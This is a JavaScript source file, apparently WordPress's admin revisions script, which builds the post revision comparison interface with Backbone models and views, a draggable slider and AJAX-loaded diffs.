/**
 * @file Revisions interface functions, Backbone classes and
 * the revisions.php document.ready bootstrap.
 *
 * @output wp-admin/js/revisions.js
 */

/* global isRtl */

window.wp = window.wp || {};

(function($) {
	var revisions;
	/**
	 * Expose the module in window.wp.revisions.
	 */
	revisions = wp.revisions = { model: {}, view: {}, controller: {} };

	// Link post revisions data served from the back end.
	revisions.settings = window._wpRevisionsSettings || {};

	// For debugging.
	revisions.debug = false;

	/**
	 * wp.revisions.log
	 *
	 * A debugging utility for revisions. Works only when a
	 * debug flag is on and the browser supports it.
	 */
	revisions.log = function() {
		if ( window.console && revisions.debug ) {
			window.console.log.apply( window.console, arguments );
		}
	};

	// Handy functions to help with positioning.
	$.fn.allOffsets = function() {
		var offset = this.offset() || {top: 0, left: 0}, win = $(window);
		return _.extend( offset, {
			right:  win.width()  - offset.left - this.outerWidth(),
			bottom: win.height() - offset.top  - this.outerHeight()
		});
	};

	$.fn.allPositions = function() {
		var position = this.position() || {top: 0, left: 0}, parent = this.parent();
		return _.extend( position, {
			right:  parent.outerWidth()  - position.left - this.outerWidth(),
			bottom: parent.outerHeight() - position.top  - this.outerHeight()
		});
	};

	/**
	 * ========================================================================
	 * MODELS
	 * ========================================================================
	 */
	revisions.model.Slider = Backbone.Model.extend({
		defaults: {
			value: null,
			values: null,
			min: 0,
			max: 1,
			step: 1,
			range: false,
			compareTwoMode: false
		},

		initialize: function( options ) {
			this.frame = options.frame;
			this.revisions = options.revisions;

			// Listen for changes to the revisions or mode from outside.
			this.listenTo( this.frame, 'update:revisions', this.receiveRevisions );
			this.listenTo( this.frame, 'change:compareTwoMode', this.updateMode );

			// Listen for internal changes.
			this.on( 'change:from', this.handleLocalChanges );
			this.on( 'change:to', this.handleLocalChanges );
			this.on( 'change:compareTwoMode', this.updateSliderSettings );
			this.on( 'update:revisions', this.updateSliderSettings );

			// Listen for changes to the hovered revision.
			this.on( 'change:hoveredRevision', this.hoverRevision );

			this.set({
				max:   this.revisions.length - 1,
				compareTwoMode: this.frame.get('compareTwoMode'),
				from: this.frame.get('from'),
				to: this.frame.get('to')
			});
			this.updateSliderSettings();
		},

		getSliderValue: function( a, b ) {
			return isRtl ? this.revisions.length - this.revisions.indexOf( this.get(a) ) - 1 : this.revisions.indexOf( this.get(b) );
		},

		updateSliderSettings: function() {
			if ( this.get('compareTwoMode') ) {
				this.set({
					values: [
						this.getSliderValue( 'to', 'from' ),
						this.getSliderValue( 'from', 'to' )
					],
					value: null,
					range: true // Ensures handles cannot cross.
				});
			} else {
				this.set({
					value: this.getSliderValue( 'to', 'to' ),
					values: null,
					range: false
				});
			}
			this.trigger( 'update:slider' );
		},

		// Called when a revision is hovered.
		hoverRevision: function( model, value ) {
			this.trigger( 'hovered:revision', value );
		},

		// Called when `compareTwoMode` changes.
		updateMode: function( model, value ) {
			this.set({ compareTwoMode: value });
		},

		// Called when `from` or `to` changes in the local model.
		handleLocalChanges: function() {
			this.frame.set({
				from: this.get('from'),
				to: this.get('to')
			});
		},

		// Receives revisions changes from outside the model.
		receiveRevisions: function( from, to ) {
			// Bail if nothing changed.
			if ( this.get('from') === from && this.get('to') === to ) {
				return;
			}

			this.set({ from: from, to: to }, { silent: true });
			this.trigger( 'update:revisions', from, to );
		}

	});

	revisions.model.Tooltip = Backbone.Model.extend({
		defaults: {
			revision: null,
			offset: {},
			hovering: false, // Whether the mouse is hovering.
			scrubbing: false // Whether the mouse is scrubbing.
		},

		initialize: function( options ) {
			this.frame = options.frame;
			this.revisions = options.revisions;
			this.slider = options.slider;

			this.listenTo( this.slider, 'hovered:revision', this.updateRevision );
			this.listenTo( this.slider, 'change:hovering', this.setHovering );
			this.listenTo( this.slider, 'change:scrubbing', this.setScrubbing );
		},


		updateRevision: function( revision ) {
			this.set({ revision: revision });
		},

		setHovering: function( model, value ) {
			this.set({ hovering: value });
		},

		setScrubbing: function( model, value ) {
			this.set({ scrubbing: value });
		}
	});

	revisions.model.Revision = Backbone.Model.extend({});

	/**
	 * wp.revisions.model.Revisions
	 *
	 * A collection of post revisions.
	 */
	revisions.model.Revisions = Backbone.Collection.extend({
		model: revisions.model.Revision,

		initialize: function() {
			_.bindAll( this, 'next', 'prev' );
		},

		next: function( revision ) {
			var index = this.indexOf( revision );

			if ( index !== -1 && index !== this.length - 1 ) {
				return this.at( index + 1 );
			}
		},

		prev: function( revision ) {
			var index = this.indexOf( revision );

			if ( index !== -1 && index !== 0 ) {
				return this.at( index - 1 );
			}
		}
	});

	revisions.model.Field = Backbone.Model.extend({});

	revisions.model.Fields = Backbone.Collection.extend({
		model: revisions.model.Field
	});

	revisions.model.Diff = Backbone.Model.extend({
		initialize: function() {
			var fields = this.get('fields');
			this.unset('fields');

			this.fields = new revisions.model.Fields( fields );
		}
	});

	revisions.model.Diffs = Backbone.Collection.extend({
		initialize: function( models, options ) {
			_.bindAll( this, 'getClosestUnloaded' );
			this.loadAll = _.once( this._loadAll );
			this.revisions = options.revisions;
			this.postId = options.postId;
			this.requests  = {};
		},

		model: revisions.model.Diff,

		ensure: function( id, context ) {
			var diff     = this.get( id ),
				request  = this.requests[ id ],
				deferred = $.Deferred(),
				ids      = {},
				from     = id.split(':')[0],
				to       = id.split(':')[1];
			ids[id] = true;

			wp.revisions.log( 'ensure', id );

			this.trigger( 'ensure', ids, from, to, deferred.promise() );

			if ( diff ) {
				deferred.resolveWith( context, [ diff ] );
			} else {
				this.trigger( 'ensure:load', ids, from, to, deferred.promise() );
				_.each( ids, _.bind( function( id ) {
					// Remove anything that has an ongoing request.
					if ( this.requests[ id ] ) {
						delete ids[ id ];
					}
					// Remove anything we already have.
					if ( this.get( id ) ) {
						delete ids[ id ];
					}
				}, this ) );
				if ( ! request ) {
					// Always include the ID that started this ensure.
					ids[ id ] = true;
					request   = this.load( _.keys( ids ) );
				}

				request.done( _.bind( function() {
					deferred.resolveWith( context, [ this.get( id ) ] );
				}, this ) ).fail( _.bind( function() {
					deferred.reject();
				}) );
			}

			return deferred.promise();
		},

		// Returns an array of proximal diffs.
		getClosestUnloaded: function( ids, centerId ) {
			var self = this;
			return _.chain([0].concat( ids )).initial().zip( ids ).sortBy( function( pair ) {
				return Math.abs( centerId - pair[1] );
			}).map( function( pair ) {
				return pair.join(':');
			}).filter( function( diffId ) {
				return _.isUndefined( self.get( diffId ) ) && ! self.requests[ diffId ];
			}).value();
		},

		_loadAll: function( allRevisionIds, centerId, num ) {
			var self = this, deferred = $.Deferred(),
				diffs = _.first( this.getClosestUnloaded( allRevisionIds, centerId ), num );
			if ( _.size( diffs ) > 0 ) {
				this.load( diffs ).done( function() {
					self._loadAll( allRevisionIds, centerId, num ).done( function() {
						deferred.resolve();
					});
				}).fail( function() {
					if ( 1 === num ) { // Already tried 1. This just isn't working. Give up.
						deferred.reject();
					} else { // Request fewer diffs this time.
						self._loadAll( allRevisionIds, centerId, Math.ceil( num / 2 ) ).done( function() {
							deferred.resolve();
						});
					}
				});
			} else {
				deferred.resolve();
			}
			return deferred;
		},

		load: function( comparisons ) {
			wp.revisions.log( 'load', comparisons );
			// Our collection should only ever grow, never shrink, so `remove: false`.
			return this.fetch({ data: { compare: comparisons }, remove: false }).done( function() {
				wp.revisions.log( 'load:complete', comparisons );
			});
		},

		sync: function( method, model, options ) {
			if ( 'read' === method ) {
				options = options || {};
				options.context = this;
				options.data = _.extend( options.data || {}, {
					action: 'get-revision-diffs',
					post_id: this.postId
				});

				var deferred = wp.ajax.send( options ),
					requests = this.requests;

				// Record that we're requesting each diff.
				if ( options.data.compare ) {
					_.each( options.data.compare, function( id ) {
						requests[ id ] = deferred;
					});
				}

				// When the request completes, clear the stored request.
				deferred.always( function() {
					if ( options.data.compare ) {
						_.each( options.data.compare, function( id ) {
							delete requests[ id ];
						});
					}
				});

				return deferred;

			// Otherwise, fall back to `Backbone.sync()`.
			} else {
				return Backbone.Model.prototype.sync.apply( this, arguments );
			}
		}
	});


	/**
	 * wp.revisions.model.FrameState
	 *
	 * The frame state.
	 *
	 * @see wp.revisions.view.Frame
	 *
	 * @param {object}                    attributes        Model attributes - none are required.
	 * @param {object}                    options           Options for the model.
	 * @param {revisions.model.Revisions} options.revisions A collection of revisions.
	 */
	revisions.model.FrameState = Backbone.Model.extend({
		defaults: {
			loading: false,
			error: false,
			compareTwoMode: false
		},

		initialize: function( attributes, options ) {
			var state = this.get( 'initialDiffState' );
			_.bindAll( this, 'receiveDiff' );
			this._debouncedEnsureDiff = _.debounce( this._ensureDiff, 200 );

			this.revisions = options.revisions;

			this.diffs = new revisions.model.Diffs( [], {
				revisions: this.revisions,
				postId: this.get( 'postId' )
			} );

			// Set the initial diffs collection.
			this.diffs.set( this.get( 'diffData' ) );

			// Set up internal listeners.
			this.listenTo( this, 'change:from', this.changeRevisionHandler );
			this.listenTo( this, 'change:to', this.changeRevisionHandler );
			this.listenTo( this, 'change:compareTwoMode', this.changeMode );
			this.listenTo( this, 'update:revisions', this.updatedRevisions );
			this.listenTo( this.diffs, 'ensure:load', this.updateLoadingStatus );
			this.listenTo( this, 'update:diff', this.updateLoadingStatus );

			// Set the initial revisions, baseUrl, and mode as provided through attributes.

			this.set( {
				to : this.revisions.get( state.to ),
				from : this.revisions.get( state.from ),
				compareTwoMode : state.compareTwoMode
			} );

			// Start the router if browser supports History API.
			if ( window.history && window.history.pushState ) {
				this.router = new revisions.Router({ model: this });
				if ( Backbone.History.started ) {
					Backbone.history.stop();
				}
				Backbone.history.start({ pushState: true });
			}
		},

		updateLoadingStatus: function() {
			this.set( 'error', false );
			this.set( 'loading', ! this.diff() );
		},

		changeMode: function( model, value ) {
			var toIndex = this.revisions.indexOf( this.get( 'to' ) );

			// If we were on the first revision before switching to two-handled mode,
			// bump the 'to' position over one.
			if ( value && 0 === toIndex ) {
				this.set({
					from: this.revisions.at( toIndex ),
					to:   this.revisions.at( toIndex + 1 )
				});
			}

			// When switching back to single-handled mode, reset 'from' model to
			// one position before the 'to' model.
			if ( ! value && 0 !== toIndex ) { // '! value' means switching to single-handled mode.
				this.set({
					from: this.revisions.at( toIndex - 1 ),
					to:   this.revisions.at( toIndex )
				});
			}
		},

		updatedRevisions: function( from, to ) {
			if ( this.get( 'compareTwoMode' ) ) {
				// @todo Compare-two loading strategy.
			} else {
				this.diffs.loadAll( this.revisions.pluck('id'), to.id, 40 );
			}
		},

		// Fetch the currently loaded diff.
		diff: function() {
			return this.diffs.get( this._diffId );
		},

		/*
		 * So long as `from` and `to` are changed at the same time, the diff
		 * will only be updated once. This is because Backbone updates all of
		 * the changed attributes in `set`, and then fires the `change` events.
		 */
		updateDiff: function( options ) {
			var from, to, diffId, diff;

			options = options || {};
			from = this.get('from');
			to = this.get('to');
			diffId = ( from ? from.id : 0 ) + ':' + to.id;

			// Check if we're actually changing the diff id.
			if ( this._diffId === diffId ) {
				return $.Deferred().reject().promise();
			}

			this._diffId = diffId;
			this.trigger( 'update:revisions', from, to );

			diff = this.diffs.get( diffId );

			// If we already have the diff, then immediately trigger the update.
			if ( diff ) {
				this.receiveDiff( diff );
				return $.Deferred().resolve().promise();
			// Otherwise, fetch the diff.
			} else {
				if ( options.immediate ) {
					return this._ensureDiff();
				} else {
					this._debouncedEnsureDiff();
					return $.Deferred().reject().promise();
				}
			}
		},

		// A simple wrapper around `updateDiff` to prevent the change event's
		// parameters from being passed through.
		changeRevisionHandler: function() {
			this.updateDiff();
		},

		receiveDiff: function( diff ) {
			// Did we actually get a diff?
			if ( _.isUndefined( diff ) || _.isUndefined( diff.id ) ) {
				this.set({
					loading: false,
					error: true
				});
			} else if ( this._diffId === diff.id ) { // Make sure the current diff didn't change.
				this.trigger( 'update:diff', diff );
			}
		},

		_ensureDiff: function() {
			return this.diffs.ensure( this._diffId, this ).always( this.receiveDiff );
		}
	});


	/**
	 * ========================================================================
	 * VIEWS
	 * ========================================================================
	 */

	/**
	 * wp.revisions.view.Frame
	 *
	 * Top level frame that orchestrates the revisions experience.
	 *
	 * @param {object}                     options       The options hash for the view.
	 * @param {revisions.model.FrameState} options.model The frame state model.
	 */
	revisions.view.Frame = wp.Backbone.View.extend({
		className: 'revisions',
		template: wp.template('revisions-frame'),

		initialize: function() {
			this.listenTo( this.model, 'update:diff', this.renderDiff );
			this.listenTo( this.model, 'change:compareTwoMode', this.updateCompareTwoMode );
			this.listenTo( this.model, 'change:loading', this.updateLoadingStatus );
			this.listenTo( this.model, 'change:error', this.updateErrorStatus );

			this.views.set( '.revisions-control-frame', new revisions.view.Controls({
				model: this.model
			}) );
		},

		render: function() {
			wp.Backbone.View.prototype.render.apply( this, arguments );

			$('html').css( 'overflow-y', 'scroll' );
			$('#wpbody-content .wrap').append( this.el );
			this.updateCompareTwoMode();
			this.renderDiff( this.model.diff() );
			this.views.ready();

			return this;
		},

		renderDiff: function( diff ) {
			this.views.set( '.revisions-diff-frame', new revisions.view.Diff({
				model: diff
			}) );
		},

		updateLoadingStatus: function() {
			this.$el.toggleClass( 'loading', this.model.get('loading') );
		},

		updateErrorStatus: function() {
			this.$el.toggleClass( 'diff-error', this.model.get('error') );
		},

		updateCompareTwoMode: function() {
			this.$el.toggleClass( 'comparing-two-revisions', this.model.get('compareTwoMode') );
		}
	});

	/**
	 * wp.revisions.view.Controls
	 *
	 * The controls view.
	 *
	 * Contains the revision slider, previous/next buttons, the meta info and the compare checkbox.
	 */
	revisions.view.Controls = wp.Backbone.View.extend({
		className: 'revisions-controls',

		initialize: function() {
			_.bindAll( this, 'setWidth' );

			// Add the button view.
			this.views.add( new revisions.view.Buttons({
				model: this.model
			}) );

			// Add the checkbox view.
			this.views.add( new revisions.view.Checkbox({
				model: this.model
			}) );

			// Prep the slider model.
			var slider = new revisions.model.Slider({
				frame: this.model,
				revisions: this.model.revisions
			}),

			// Prep the tooltip model.
			tooltip = new revisions.model.Tooltip({
				frame: this.model,
				revisions: this.model.revisions,
				slider: slider
			});

			// Add the tooltip view.
			this.views.add( new revisions.view.Tooltip({
				model: tooltip
			}) );

			// Add the tickmarks view.
			this.views.add( new revisions.view.Tickmarks({
				model: tooltip
			}) );

			// Add the slider view.
			this.views.add( new revisions.view.Slider({
				model: slider
			}) );

			// Add the Metabox view.
			this.views.add( new revisions.view.Metabox({
				model: this.model
			}) );
		},

		ready: function() {
			this.top = this.$el.offset().top;
			this.window = $(window);
			this.window.on( 'scroll.wp.revisions', {controls: this}, function(e) {
				var controls  = e.data.controls,
					container = controls.$el.parent(),
					scrolled  = controls.window.scrollTop(),
					frame     = controls.views.parent;

				if ( scrolled >= controls.top ) {
					if ( ! frame.$el.hasClass('pinned') ) {
						controls.setWidth();
						container.css('height', container.height() + 'px' );
						controls.window.on('resize.wp.revisions.pinning click.wp.revisions.pinning', {controls: controls}, function(e) {
							e.data.controls.setWidth();
						});
					}
					frame.$el.addClass('pinned');
				} else if ( frame.$el.hasClass('pinned') ) {
					controls.window.off('.wp.revisions.pinning');
					controls.$el.css('width', 'auto');
					frame.$el.removeClass('pinned');
					container.css('height', 'auto');
					controls.top = controls.$el.offset().top;
				} else {
					controls.top = controls.$el.offset().top;
				}
			});
		},

		setWidth: function() {
			this.$el.css('width', this.$el.parent().width() + 'px');
		}
	});

	// The tickmarks view.
	revisions.view.Tickmarks = wp.Backbone.View.extend({
		className: 'revisions-tickmarks',
		direction: isRtl ? 'right' : 'left',

		initialize: function() {
			this.listenTo( this.model, 'change:revision', this.reportTickPosition );
		},

		reportTickPosition: function( model, revision ) {
			var offset, thisOffset, parentOffset, tick, index = this.model.revisions.indexOf( revision );
			thisOffset = this.$el.allOffsets();
			parentOffset = this.$el.parent().allOffsets();
			if ( index === this.model.revisions.length - 1 ) {
				// Last one.
				offset = {
					rightPlusWidth: thisOffset.left - parentOffset.left + 1,
					leftPlusWidth: thisOffset.right - parentOffset.right + 1
				};
			} else {
				// Normal tick.
				tick = this.$('div:nth-of-type(' + (index + 1) + ')');
				offset = tick.allPositions();
				_.extend( offset, {
					left: offset.left + thisOffset.left - parentOffset.left,
					right: offset.right + thisOffset.right - parentOffset.right
				});
				_.extend( offset, {
					leftPlusWidth: offset.left + tick.outerWidth(),
					rightPlusWidth: offset.right + tick.outerWidth()
				});
			}
			this.model.set({ offset: offset });
		},

		ready: function() {
			var tickCount, tickWidth;
			tickCount = this.model.revisions.length - 1;
			tickWidth = 1 / tickCount;
			this.$el.css('width', ( this.model.revisions.length * 50 ) + 'px');

			_(tickCount).times( function( index ){
				this.$el.append( '<div style="' + this.direction + ': ' + ( 100 * tickWidth * index ) + '%"></div>' );
			}, this );
		}
	});

	// The metabox view.
	revisions.view.Metabox = wp.Backbone.View.extend({
		className: 'revisions-meta',

		initialize: function() {
			// Add the 'from' view.
			this.views.add( new revisions.view.MetaFrom({
				model: this.model,
				className: 'diff-meta diff-meta-from'
			}) );

			// Add the 'to' view.
			this.views.add( new revisions.view.MetaTo({
				model: this.model
			}) );
		}
	});

	// The revision meta view (to be extended).
	revisions.view.Meta = wp.Backbone.View.extend({
		template: wp.template('revisions-meta'),

		events: {
			'click .restore-revision': 'restoreRevision'
		},

		initialize: function() {
			this.listenTo( this.model, 'update:revisions', this.render );
		},

		prepare: function() {
			return _.extend( this.model.toJSON()[this.type] || {}, {
				type: this.type
			});
		},

		restoreRevision: function() {
			document.location = this.model.get('to').attributes.restoreUrl;
		}
	});

	// The revision meta 'from' view.
	revisions.view.MetaFrom = revisions.view.Meta.extend({
		className: 'diff-meta diff-meta-from',
		type: 'from'
	});

	// The revision meta 'to' view.
	revisions.view.MetaTo = revisions.view.Meta.extend({
		className: 'diff-meta diff-meta-to',
		type: 'to'
	});

	// The checkbox view.
	revisions.view.Checkbox = wp.Backbone.View.extend({
		className: 'revisions-checkbox',
		template: wp.template('revisions-checkbox'),

		events: {
			'click .compare-two-revisions': 'compareTwoToggle'
		},

		initialize: function() {
			this.listenTo( this.model, 'change:compareTwoMode', this.updateCompareTwoMode );
		},

		ready: function() {
			if ( this.model.revisions.length < 3 ) {
				$('.revision-toggle-compare-mode').hide();
			}
		},

		updateCompareTwoMode: function() {
			this.$('.compare-two-revisions').prop( 'checked', this.model.get('compareTwoMode') );
		},

		// Toggle the compare two mode feature when the compare two checkbox is checked.
		compareTwoToggle: function() {
			// Activate compare two mode?
			this.model.set({ compareTwoMode: $('.compare-two-revisions').prop('checked') });
		}
	});

	// The tooltip view.
	// Encapsulates the tooltip.
	revisions.view.Tooltip = wp.Backbone.View.extend({
		className: 'revisions-tooltip',
		template: wp.template('revisions-meta'),

		initialize: function() {
			this.listenTo( this.model, 'change:offset', this.render );
			this.listenTo( this.model, 'change:hovering', this.toggleVisibility );
			this.listenTo( this.model, 'change:scrubbing', this.toggleVisibility );
		},

		prepare: function() {
			if ( _.isNull( this.model.get('revision') ) ) {
				return;
			} else {
				return _.extend( { type: 'tooltip' }, {
					attributes: this.model.get('revision').toJSON()
				});
			}
		},

		render: function() {
			var otherDirection,
				direction,
				directionVal,
				flipped,
				css      = {},
				position = this.model.revisions.indexOf( this.model.get('revision') ) + 1;

			flipped = ( position / this.model.revisions.length ) > 0.5;
			if ( isRtl ) {
				direction = flipped ? 'left' : 'right';
				directionVal = flipped ? 'leftPlusWidth' : direction;
			} else {
				direction = flipped ? 'right' : 'left';
				directionVal = flipped ? 'rightPlusWidth' : direction;
			}
			otherDirection = 'right' === direction ? 'left': 'right';
			wp.Backbone.View.prototype.render.apply( this, arguments );
			css[direction] = this.model.get('offset')[directionVal] + 'px';
			css[otherDirection] = '';
			this.$el.toggleClass( 'flipped', flipped ).css( css );
		},

		visible: function() {
			return this.model.get( 'scrubbing' ) || this.model.get( 'hovering' );
		},

		toggleVisibility: function() {
			if ( this.visible() ) {
				this.$el.stop().show().fadeTo( 100 - this.el.style.opacity * 100, 1 );
			} else {
				this.$el.stop().fadeTo( this.el.style.opacity * 300, 0, function(){ $(this).hide(); } );
			}
			return;
		}
	});

	// The buttons view.
	// Encapsulates all of the configuration for the previous/next buttons.
	revisions.view.Buttons = wp.Backbone.View.extend({
		className: 'revisions-buttons',
		template: wp.template('revisions-buttons'),

		events: {
			'click .revisions-next .button': 'nextRevision',
			'click .revisions-previous .button': 'previousRevision'
		},

		initialize: function() {
			this.listenTo( this.model, 'update:revisions', this.disabledButtonCheck );
		},

		ready: function() {
			this.disabledButtonCheck();
		},

		// Go to a specific model index.
		gotoModel: function( toIndex ) {
			var attributes = {
				to: this.model.revisions.at( toIndex )
			};
			// If we're at the first revision, unset 'from'.
			if ( toIndex ) {
				attributes.from = this.model.revisions.at( toIndex - 1 );
			} else {
				this.model.unset('from', { silent: true });
			}

			this.model.set( attributes );
		},

		// Go to the 'next' revision.
		nextRevision: function() {
			var toIndex = this.model.revisions.indexOf( this.model.get('to') ) + 1;
			this.gotoModel( toIndex );
		},

		// Go to the 'previous' revision.
		previousRevision: function() {
			var toIndex = this.model.revisions.indexOf( this.model.get('to') ) - 1;
			this.gotoModel( toIndex );
		},

		// Check to see if the Previous or Next buttons need to be disabled or enabled.
		disabledButtonCheck: function() {
			var maxVal   = this.model.revisions.length - 1,
				minVal   = 0,
				next     = $('.revisions-next .button'),
				previous = $('.revisions-previous .button'),
				val      = this.model.revisions.indexOf( this.model.get('to') );

			// Disable "Next" button if you're on the last node.
			next.prop( 'disabled', ( maxVal === val ) );

			// Disable "Previous" button if you're on the first node.
			previous.prop( 'disabled', ( minVal === val ) );
		}
	});


	// The slider view.
	revisions.view.Slider = wp.Backbone.View.extend({
		className: 'wp-slider',
		direction: isRtl ? 'right' : 'left',

		events: {
			'mousemove' : 'mouseMove'
		},

		initialize: function() {
			_.bindAll( this, 'start', 'slide', 'stop', 'mouseMove', 'mouseEnter', 'mouseLeave' );
			this.listenTo( this.model, 'update:slider', this.applySliderSettings );
		},

		ready: function() {
			this.$el.css('width', ( this.model.revisions.length * 50 ) + 'px');
			this.$el.slider( _.extend( this.model.toJSON(), {
				start: this.start,
				slide: this.slide,
				stop:  this.stop
			}) );

			this.$el.hoverIntent({
				over: this.mouseEnter,
				out: this.mouseLeave,
				timeout: 800
			});

			this.applySliderSettings();
		},

		mouseMove: function( e ) {
			var zoneCount         = this.model.revisions.length - 1,       // One fewer zone than models.
				sliderFrom        = this.$el.allOffsets()[this.direction], // "From" edge of slider.
				sliderWidth       = this.$el.width(),                      // Width of slider.
				tickWidth         = sliderWidth / zoneCount,               // Calculated width of zone.
				actualX           = ( isRtl ? $(window).width() - e.pageX : e.pageX ) - sliderFrom, // Flipped for RTL - sliderFrom.
				currentModelIndex = Math.floor( ( actualX  + ( tickWidth / 2 )  ) / tickWidth );    // Calculate the model index.

			// Ensure sane value for currentModelIndex.
			if ( currentModelIndex < 0 ) {
				currentModelIndex = 0;
			} else if ( currentModelIndex >= this.model.revisions.length ) {
				currentModelIndex = this.model.revisions.length - 1;
			}

			// Update the tooltip mode.
			this.model.set({ hoveredRevision: this.model.revisions.at( currentModelIndex ) });
		},

		mouseLeave: function() {
			this.model.set({ hovering: false });
		},

		mouseEnter: function() {
			this.model.set({ hovering: true });
		},

		applySliderSettings: function() {
			this.$el.slider( _.pick( this.model.toJSON(), 'value', 'values', 'range' ) );
			var handles = this.$('a.ui-slider-handle');

			if ( this.model.get('compareTwoMode') ) {
				// In RTL mode the 'left handle' is the second in the slider, 'right' is first.
				handles.first()
					.toggleClass( 'to-handle', !! isRtl )
					.toggleClass( 'from-handle', ! isRtl );
				handles.last()
					.toggleClass( 'from-handle', !! isRtl )
					.toggleClass( 'to-handle', ! isRtl );
			} else {
				handles.removeClass('from-handle to-handle');
			}
		},

		start: function( event, ui ) {
			this.model.set({ scrubbing: true });

			// Track the mouse position to enable smooth dragging,
			// overrides default jQuery UI step behavior.
			$( window ).on( 'mousemove.wp.revisions', { view: this }, function( e ) {
				var handles,
					view              = e.data.view,
					leftDragBoundary  = view.$el.offset().left,
					sliderOffset      = leftDragBoundary,
					sliderRightEdge   = leftDragBoundary + view.$el.width(),
					rightDragBoundary = sliderRightEdge,
					leftDragReset     = '0',
					rightDragReset    = '100%',
					handle            = $( ui.handle );

				// In two handle mode, ensure handles can't be dragged past each other.
				// Adjust left/right boundaries and reset points.
				if ( view.model.get('compareTwoMode') ) {
					handles = handle.parent().find('.ui-slider-handle');
					if ( handle.is( handles.first() ) ) {
						// We're the left handle.
						rightDragBoundary = handles.last().offset().left;
						rightDragReset    = rightDragBoundary - sliderOffset;
					} else {
						// We're the right handle.
						leftDragBoundary = handles.first().offset().left + handles.first().width();
						leftDragReset    = leftDragBoundary - sliderOffset;
					}
				}

				// Follow mouse movements, as long as handle remains inside slider.
				if ( e.pageX < leftDragBoundary ) {
					handle.css( 'left', leftDragReset ); // Mouse to left of slider.
				} else if ( e.pageX > rightDragBoundary ) {
					handle.css( 'left', rightDragReset ); // Mouse to right of slider.
				} else {
					handle.css( 'left', e.pageX - sliderOffset ); // Mouse in slider.
				}
			} );
		},

		getPosition: function( position ) {
			return isRtl ? this.model.revisions.length - position - 1: position;
		},

		// Responds to slide events.
		slide: function( event, ui ) {
			var attributes, movedRevision;
			// Compare two revisions mode.
			if ( this.model.get('compareTwoMode') ) {
				// Prevent sliders from occupying same spot.
				if ( ui.values[1] === ui.values[0] ) {
					return false;
				}
				if ( isRtl ) {
					ui.values.reverse();
				}
				attributes = {
					from: this.model.revisions.at( this.getPosition( ui.values[0] ) ),
					to: this.model.revisions.at( this.getPosition( ui.values[1] ) )
				};
			} else {
				attributes = {
					to: this.model.revisions.at( this.getPosition( ui.value ) )
				};
				// If we're at the first revision, unset 'from'.
				if ( this.getPosition( ui.value ) > 0 ) {
					attributes.from = this.model.revisions.at( this.getPosition( ui.value ) - 1 );
				} else {
					attributes.from = undefined;
				}
			}
			movedRevision = this.model.revisions.at( this.getPosition( ui.value ) );

			// If we are scrubbing, a scrub to a revision is considered a hover.
			if ( this.model.get('scrubbing') ) {
				attributes.hoveredRevision = movedRevision;
			}

			this.model.set( attributes );
		},

		stop: function() {
			$( window ).off('mousemove.wp.revisions');
			this.model.updateSliderSettings(); // To snap us back to a tick mark.
			this.model.set({ scrubbing: false });
		}
	});

	// The diff view.
	// This is the view for the current active diff.
	revisions.view.Diff = wp.Backbone.View.extend({
		className: 'revisions-diff',
		template:  wp.template('revisions-diff'),

		// Generate the options to be passed to the template.
		prepare: function() {
			return _.extend({ fields: this.model.fields.toJSON() }, this.options );
		}
	});

	// The revisions router.
	// Maintains the URL routes so browser URL matches state.
	revisions.Router = Backbone.Router.extend({
		initialize: function( options ) {
			this.model = options.model;

			// Maintain state and history when navigating.
			this.listenTo( this.model, 'update:diff', _.debounce( this.updateUrl, 250 ) );
			this.listenTo( this.model, 'change:compareTwoMode', this.updateUrl );
		},

		baseUrl: function( url ) {
			return this.model.get('baseUrl') + url;
		},

		updateUrl: function() {
			var from = this.model.has('from') ? this.model.get('from').id : 0,
				to   = this.model.get('to').id;
			if ( this.model.get('compareTwoMode' ) ) {
				this.navigate( this.baseUrl( '?from=' + from + '&to=' + to ), { replace: true } );
			} else {
				this.navigate( this.baseUrl( '?revision=' + to ), { replace: true } );
			}
		},

		handleRoute: function( a, b ) {
			var compareTwo = _.isUndefined( b );

			if ( ! compareTwo ) {
				b = this.model.revisions.get( a );
				a = this.model.revisions.prev( b );
				b = b ? b.id : 0;
				a = a ? a.id : 0;
			}
		}
	});

	/**
	 * Initialize the revisions UI for revision.php.
	 */
	revisions.init = function() {
		var state;

		// Bail if the current page is not revision.php.
		if ( ! window.adminpage || 'revision-php' !== window.adminpage ) {
			return;
		}

		state = new revisions.model.FrameState({
			initialDiffState: {
				// wp_localize_script doesn't stringifies ints, so cast them.
				to: parseInt( revisions.settings.to, 10 ),
				from: parseInt( revisions.settings.from, 10 ),
				// wp_localize_script does not allow for top-level booleans so do a comparator here.
				compareTwoMode: ( revisions.settings.compareTwoMode === '1' )
			},
			diffData: revisions.settings.diffData,
			baseUrl: revisions.settings.baseUrl,
			postId: parseInt( revisions.settings.postId, 10 )
		}, {
			revisions: new revisions.model.Revisions( revisions.settings.revisionData )
		});

		revisions.view.frame = new revisions.view.Frame({
			model: state
		}).render();
	};

	$( revisions.init );
}(jQuery));
